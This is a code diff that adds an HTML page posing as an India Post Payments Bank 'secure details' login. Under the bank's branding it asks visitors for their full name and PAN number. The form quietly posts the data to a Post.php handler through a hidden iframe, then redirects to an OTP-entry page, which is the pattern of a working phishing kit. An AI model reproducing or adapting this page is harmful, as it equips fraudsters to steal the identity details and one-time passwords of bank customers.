@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300&display=swap" rel="stylesheet">
+    <title>India Post Payment Bank Secure Details/login</title>
+    <style>
+    #hh,#ft
+    {
+    width: 116%;
+    margin:-8%;
+    margin-left:-5.6%;
+    }  
+    .login-box {
+    width: 90%;
+    padding: 10px;
+    }
+    
+    .login-box .user-box {
+    position: relative;
+    }
+    
+    .login-box .user-box input {
+    width: 90%;
+    padding: 2px 4px;
+    font-size: 16px;
+    color: black;
+    font-weight:bold;
+    margin-bottom: 40px;
+    margin-left:20px;
+    border: none;
+    border-bottom: 1.5px solid #CCCCCC;
+    outline: none;
+    background: transparent;
+    transition: border-color 0.2s;
+    }
+    .login-box .user-box label {
+    position: absolute;
+    top:-10px;
+    left: 20px;
+    padding: 10px 0px;
+    font-size: 16px;
+    font-family: 'Inter', sans-serif;
+    color: #AF2925;
+    pointer-events: none;
+    transition: 0.2s;
+    font-style:italic;
+    font-weight:bold;
+    
+    }
+    .login-box input:focus {
+    width:90%;
+    margin-bottom: 40px;
+    padding: 2px 4px;
+    margin-left:20px;
+    font-size:16px;
+    border-width: 1.5px;
+    border-image: linear-gradient(#AF2924,#AF2925);
+    border-image-slice: 1;
+    font-weight:bold;
+    
+    }
+    
+    .login-box .user-box input:focus ~ label,
+    .login-box .user-box input:valid ~ label {
+    top: -30px;
+    left: 20px;
+    margin-left:4px;
+    color: #AF2925;
+    font-size: 12px;
+    font-family: 'Inter', sans-serif;
+    font-weight:bold;
+    }
+    
+    #ll
+    {
+    background-color:#AE2924;
+    color: white;
+    margin-bottom:56%;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px;
+    font-family: 'Inter', sans-serif;
+    font-weight:bold;
+    width: 90%; height: 40px;
+    }
+    
+    #ll:hover
+    {
+    background-color:#3E1128;
+    color: white;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px;
+    font-family: 'Inter', sans-serif;
+    font-weight:bold;
+    width: 90%; height: 40px;
+    }
+    #kyc
+    {
+    width:116%;   
+    background-color:#3E1128;
+    height:70px;
+    margin:1.2%;
+    margin-left:-5.6%;
+    }
+    .Fname
+    {
+    text-transform:uppercase;
+    }
+    .PAN
+    {
+    text-transform:uppercase;
+    }
+    .error
+    {
+    position:absolute;
+    top:35%;
+    color: Red;
+    font-family: 'DM Sans', sans-serif;
+    font-size:12px;
+    margin:5px;
+    margin-left:-94%;
+    visibility: hidden;
+    font-style: italic;
+    }
+    </style>
+    </head>
+    <body>
+    <div class="login-box">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_PAN.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <center><img src="indiapost.png" id="hh"></center><br>
+    <div id="kyc"><br>
+    <b style="color:white; font-family: 'Libre Franklin', sans-serif; font-size:16px; padding:20px;">VALIDATE YOUR PAN CARD DETAILS <br><span style="color:white; font-size:16px; padding:20px;"> AND PROCEED.</b>
+    </div><br><br>
+    <div class="user-box">
+    <rt>
+    <input type="text" name="Full_Name" class="Fname"
+    required="">
+    <label>Full Name (as per PAN)*</label>
+    <tr>
+    </div>
+    <div class="user-box">
+    <input type="text" name="PAN_No." class="PAN" id="dd" maxlength="10"
+    required="">
+    <span id="PAN" class="error">Invalid PAN Number</span>
+    <label>PAN Number*</label>
+    </div><br>
+    <script type="text/javascript">
+    function ValidatePAN() {
+    var txtPANCard = document.getElementById("dd");
+    var lblPANCard = document.getElementById("PAN")
+    var regex = /([A-Z]){5}([0-9]){4}([A-Z]){1}$/;
+    if (regex.test(txtPANCard.value.toUpperCase())) {
+    lblPANCard.style.visibility = "hidden";
+    return true;
+    } else {
+    lblPANCard.style.visibility = "visible";
+    return false;
+    }
+    }
+    </script>
+    <div id="kk">
+    <center><button type="submit" id="ll" onclick="ValidatePAN()" style="font-weight: bold;">SUBMIT</button></center><br>
+    </div><br>
+         <img src="footeri.jpg" alt="" id="ft">
+         </body>
+         </html>
